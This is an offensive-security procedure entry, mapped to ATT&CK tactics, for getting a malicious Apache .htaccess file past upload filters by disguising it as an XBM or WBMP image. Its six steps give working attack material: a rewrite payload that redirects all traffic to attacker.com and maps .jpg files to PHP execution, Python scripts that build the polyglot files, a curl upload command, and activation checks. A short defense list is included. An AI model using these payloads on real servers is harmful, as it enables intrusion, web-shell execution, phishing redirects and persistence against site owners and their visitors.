---
id: ea981257-414f-41e0-95d2-d6f842e85c76
name: Image-Based-htaccess-Upload-Bypass
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:40.899972+00:00'
updated_at: '2023-04-06T03:56:40.919483+00:00'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
  - '[[techniques/Ingress Tool Transfer|T1105 - Ingress Tool Transfer]]'
sub_techniques: []
tags:
  - file-upload-bypass
  - htaccess
  - polyglot-file
  - apache
commands:
  - '[[commands/check-image-type-with-file]]'
  - '[[commands/curl-upload-to-target]]'
platforms:
  - web
  - apache
tools: []
validated: true
---

# Image-Based-htaccess-Upload-Bypass

## Summary

The Image-Based .htaccess Upload Bypass procedure enables attackers to circumvent file upload validation in web applications by crafting polyglot files that appear as valid images (e.g., XBM or WBMP) but contain malicious .htaccess directives. Once uploaded to an Apache server, the .htaccess file can alter server behavior, such as redirecting traffic to attacker-controlled sites, enabling command execution, or establishing persistence through web shells.

## Description

This technique exploits weak file upload mechanisms that rely on MIME type detection or file extensions without deep content validation. By prepending valid image headers to .htaccess content, the file passes as an image during upload but is parsed as .htaccess by Apache if placed in a directory where .htaccess files are allowed. Common use cases include gaining initial access via vulnerable upload forms, achieving persistence by modifying directory configurations, or facilitating command and control through URL rewriting. The target environment is typically Apache HTTP Server with mod_rewrite enabled and .htaccess overrides permitted. Success relies on the server storing uploads in executable directories and not stripping or blocking .htaccess files explicitly. Potential outcomes include traffic redirection for phishing, credential theft via custom error pages, or execution of server-side includes.

## Requirements

1. Python 3 installed on the attacker's machine to generate polyglot files.
2. A vulnerable web application with file upload functionality that accepts images (e.g., JPEG, PNG, or monochrome formats like XBM/WBMP) but performs only superficial validation.
3. Target server running Apache with .htaccess support enabled (AllowOverride directive set to All or FileInfo).
4. Network access to the upload endpoint and the uploaded file's location.

## Defense

- Implement server-side content validation using libraries like libmagic or deep scanning to detect embedded non-image content in uploads.
- Disable .htaccess processing in upload directories via Apache configuration (AllowOverride None) and use centralized .conf files instead.
- Scan uploaded files for known polyglot patterns or .htaccess directives using tools like ClamAV or custom scripts; monitor access logs for anomalous requests to uploaded files.
- Enforce strict file extension whitelisting and rename uploads to non-executable names (e.g., append .jpg).

## Objectives

1. Bypass file upload restrictions to place a malicious .htaccess file on the target server.
2. Achieve persistence by configuring server redirects or handlers that survive vulnerability patches.
3. Redirect user traffic to malicious sites or exfiltrate sensitive data via custom .htaccess rules.

## Instructions

### Step 1: Define Malicious .htaccess Payload

**Context**: Create the content for the .htaccess file, such as rewrite rules to redirect requests or add handlers for web shell execution. This payload will be embedded in the image.

Example payload:
```
RewriteEngine On
RewriteRule ^(.*)$ http://attacker.com/redirect [R=301,L]
AddType application/x-httpd-php .jpg
```

Save this as a string variable for use in the next steps.

### Step 2: Generate XBM Polyglot File

**Context**: Use a Python script to prepend XBM image headers to the .htaccess payload, creating a file that validates as an image but functions as .htaccess when parsed by Apache.

**Code** ([[codes/create-htaccess-xbm-image-python]]):

Run the script with your defined payload:

```python
width = 50
height = 50
payload = 'RewriteEngine On\nRewriteRule ^(.*)$ http://attacker.com/redirect [R=301,L]'

with open('.htaccess', 'w') as htaccess:
    htaccess.write('#define test_width %d\n' % (width, ))
    htaccess.write('#define test_height %d\n' % (height, ))
    htaccess.write(payload)
```

> This generates a file named '.htaccess' that starts with XBM headers. Adjust width/height if needed for specific validators.

### Step 3: Verify File as Image

**Context**: Confirm the polyglot file is recognized as an image to ensure it will pass upload checks.

**Command** ([[commands/check-image-type-with-file]]):
```bash
file $_FILE_PATH
```

> The 'file' utility inspects the file's magic bytes. Expected output should indicate an XBM or bitmap image, not a text configuration file.

### Step 4: Generate WBMP Alternative (Optional)

**Context**: For servers that prefer WBMP format, create a similar polyglot using binary headers. This provides a fallback if XBM is blocked.

**Code** ([[codes/create-htaccess-wbmp-image-python]]):

Run the script:

```python
type_header = b'\x00'
fixed_header = b'\x00'
width = b'50'
height = b'50'
payload = b'RewriteEngine On\nRewriteRule ^(.*)$ http://attacker.com/redirect [R=301,L]'

with open('.htaccess', 'wb') as htaccess:
    htaccess.write(type_header + fixed_header + width + height)
    htaccess.write(b'\n')
    htaccess.write(payload)
```

> This produces a binary WBMP file with embedded .htaccess content. Verify with the check command from Step 3.

### Step 5: Upload the Polyglot File

**Context**: Submit the file to the target's upload endpoint, ensuring it's treated as an image.

**Command** ([[commands/curl-upload-to-target]]):
```bash
curl -F "file=@$_FILE_PATH" -F "submit=Upload" $_TARGET_URL
```

> Use Burp Suite or similar to intercept and modify if needed. Expected output: Success message from the upload form, with the file stored (e.g., as 'image.xbm' or renamed).

### Step 6: Validate and Activate

**Context**: Access the uploaded file's directory to confirm .htaccess execution. Test by requesting a resource that should trigger the rules.

Navigate to the upload directory URL (e.g., http://target.com/uploads/) and observe if redirects or custom behaviors occur. If the file was renamed, request it directly (e.g., http://target.com/uploads/image.xbm) to force .htaccess parsing.

**Expected Output**: Redirect to attacker site or execution of defined rules without image display errors.
